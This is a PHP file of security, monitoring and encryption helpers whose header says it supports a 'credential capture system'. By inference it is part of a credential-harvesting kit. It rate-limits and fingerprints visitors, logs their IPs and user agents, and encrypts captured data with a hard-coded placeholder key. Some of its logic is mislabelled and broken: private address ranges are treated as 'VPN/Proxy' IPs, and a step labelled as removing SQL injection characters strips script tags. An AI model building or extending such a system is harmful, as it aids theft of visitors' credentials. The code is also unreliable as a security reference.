<?php
/**
 * Security and Monitoring Enhancements
 * 
 * This file provides additional security layers and monitoring capabilities
 * for the credential capture system.
 */

// Prevent direct access
if (!defined('SECURITY_CHECK')) {
    die('Direct access not allowed');
}

class SecurityEnhancements {
    
    private static $logFile = 'security_logs.txt';
    private static $maxAttempts = 5;
    private static $blockDuration = 3600; // 1 hour
    
    /**
     * Rate limiting to prevent abuse
     * @param string $identifier IP or session identifier
     * @return bool True if request is allowed
     */
    public static function checkRateLimit($identifier) {
        $attemptsFile = 'rate_limits.json';
        $attempts = [];
        
        if (file_exists($attemptsFile)) {
            $attempts = json_decode(file_get_contents($attemptsFile), true) ?: [];
        }
        
        $now = time();
        $identifier = hash('sha256', $identifier); // Hash for privacy
        
        // Clean old attempts
        if (isset($attempts[$identifier])) {
            $attempts[$identifier] = array_filter(
                $attempts[$identifier],
                function($timestamp) use ($now) {
                    return ($now - $timestamp) < self::$blockDuration;
                }
            );
        }
        
        // Check if limit exceeded
        if (isset($attempts[$identifier]) && count($attempts[$identifier]) >= self::$maxAttempts) {
            self::logSecurity("Rate limit exceeded for identifier: " . substr($identifier, 0, 8));
            return false;
        }
        
        // Add current attempt
        $attempts[$identifier][] = $now;
        file_put_contents($attemptsFile, json_encode($attempts), LOCK_EX);
        
        return true;
    }
    
    /**
     * Validate and sanitize input data
     * @param array $data Input data to validate
     * @return array Sanitized data
     */
    public static function sanitizeInput($data) {
        $sanitized = [];
        
        foreach ($data as $key => $value) {
            // Remove potential XSS
            $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
            
            // Remove potential SQL injection characters
            $value = str_replace(['<script', '</script>', 'javascript:', 'vbscript:'], '', $value);
            
            // Limit length
            $value = substr($value, 0, 500);
            
            $sanitized[$key] = trim($value);
        }
        
        return $sanitized;
    }
    
    /**
     * Detect suspicious patterns in input
     * @param array $data Input data to analyze
     * @return bool True if suspicious patterns detected
     */
    public static function detectSuspiciousPatterns($data) {
        $suspiciousPatterns = [
            '/\b(union|select|insert|delete|drop|create|alter)\b/i', // SQL injection
            '/<script[^>]*>.*?<\/script>/is', // XSS
            '/javascript:/i', // JavaScript protocol
            '/data:text\/html/i', // Data URI XSS
            '/\bon\w+\s*=/i', // Event handlers
        ];
        
        foreach ($data as $value) {
            foreach ($suspiciousPatterns as $pattern) {
                if (preg_match($pattern, $value)) {
                    self::logSecurity("Suspicious pattern detected: " . substr($value, 0, 100));
                    return true;
                }
            }
        }
        
        return false;
    }
    
    /**
     * Get client fingerprint for tracking
     * @return string Unique client fingerprint
     */
    public static function getClientFingerprint() {
        $components = [
            $_SERVER['HTTP_USER_AGENT'] ?? '',
            $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
            $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
            $_SERVER['REMOTE_ADDR'] ?? ''
        ];
        
        return hash('sha256', implode('|', $components));
    }
    
    /**
     * Log security events
     * @param string $message Security message to log
     */
    public static function logSecurity($message) {
        $timestamp = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        $logEntry = "[{$timestamp}] IP: {$ip} | UA: " . substr($userAgent, 0, 100) . " | {$message}\n";
        
        file_put_contents(self::$logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Check if IP is from known VPN/Proxy services
     * @param string $ip IP address to check
     * @return bool True if suspicious IP
     */
    public static function checkSuspiciousIP($ip) {
        // List of known VPN/Proxy IP ranges (simplified)
        $suspiciousRanges = [
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16',
            '127.0.0.0/8'
        ];
        
        foreach ($suspiciousRanges as $range) {
            if (self::ipInRange($ip, $range)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Check if IP is in range
     * @param string $ip IP to check
     * @param string $range CIDR range
     * @return bool True if IP is in range
     */
    private static function ipInRange($ip, $range) {
        list($subnet, $mask) = explode('/', $range);
        return (ip2long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet);
    }
    
    /**
     * Generate secure session token
     * @return string Secure token
     */
    public static function generateSecureToken() {
        return bin2hex(random_bytes(32));
    }
    
    /**
     * Validate session token
     * @param string $token Token to validate
     * @param string $sessionToken Expected session token
     * @return bool True if valid
     */
    public static function validateToken($token, $sessionToken) {
        return hash_equals($sessionToken, $token);
    }
}

/**
 * Enhanced monitoring class
 */
class MonitoringEnhancements {
    
    private static $metricsFile = 'metrics.json';
    
    /**
     * Record metrics for monitoring
     * @param string $event Event type
     * @param array $data Additional data
     */
    public static function recordMetric($event, $data = []) {
        $metrics = [];
        
        if (file_exists(self::$metricsFile)) {
            $metrics = json_decode(file_get_contents(self::$metricsFile), true) ?: [];
        }
        
        $timestamp = time();
        $date = date('Y-m-d');
        
        if (!isset($metrics[$date])) {
            $metrics[$date] = [];
        }
        
        if (!isset($metrics[$date][$event])) {
            $metrics[$date][$event] = [];
        }
        
        $metrics[$date][$event][] = [
            'timestamp' => $timestamp,
            'data' => $data
        ];
        
        // Keep only last 30 days
        $cutoff = date('Y-m-d', strtotime('-30 days'));
        foreach ($metrics as $date => $events) {
            if ($date < $cutoff) {
                unset($metrics[$date]);
            }
        }
        
        file_put_contents(self::$metricsFile, json_encode($metrics), LOCK_EX);
    }
    
    /**
     * Get metrics summary
     * @param int $days Number of days to include
     * @return array Metrics summary
     */
    public static function getMetricsSummary($days = 7) {
        if (!file_exists(self::$metricsFile)) {
            return [];
        }
        
        $metrics = json_decode(file_get_contents(self::$metricsFile), true) ?: [];
        $summary = [];
        
        $startDate = date('Y-m-d', strtotime("-{$days} days"));
        
        foreach ($metrics as $date => $events) {
            if ($date >= $startDate) {
                foreach ($events as $event => $occurrences) {
                    if (!isset($summary[$event])) {
                        $summary[$event] = 0;
                    }
                    $summary[$event] += count($occurrences);
                }
            }
        }
        
        return $summary;
    }
    
    /**
     * Check for anomalies in metrics
     * @return array List of detected anomalies
     */
    public static function detectAnomalies() {
        $summary = self::getMetricsSummary(7);
        $anomalies = [];
        
        // Check for unusual spikes
        foreach ($summary as $event => $count) {
            if ($count > 100) { // Threshold for suspicious activity
                $anomalies[] = "High volume of {$event}: {$count} occurrences in last 7 days";
            }
        }
        
        return $anomalies;
    }
}

/**
 * Data encryption utilities
 */
class EncryptionUtils {
    
    private static $key = 'your-encryption-key-here'; // Change this!
    
    /**
     * Encrypt sensitive data
     * @param string $data Data to encrypt
     * @return string Encrypted data
     */
    public static function encrypt($data) {
        $iv = random_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', self::$key, 0, $iv);
        return base64_encode($iv . $encrypted);
    }
    
    /**
     * Decrypt sensitive data
     * @param string $encryptedData Encrypted data
     * @return string Decrypted data
     */
    public static function decrypt($encryptedData) {
        $data = base64_decode($encryptedData);
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        return openssl_decrypt($encrypted, 'AES-256-CBC', self::$key, 0, $iv);
    }
    
    /**
     * Hash sensitive data for storage
     * @param string $data Data to hash
     * @return string Hashed data
     */
    public static function hashData($data) {
        return hash('sha256', $data . self::$key);
    }
}

?>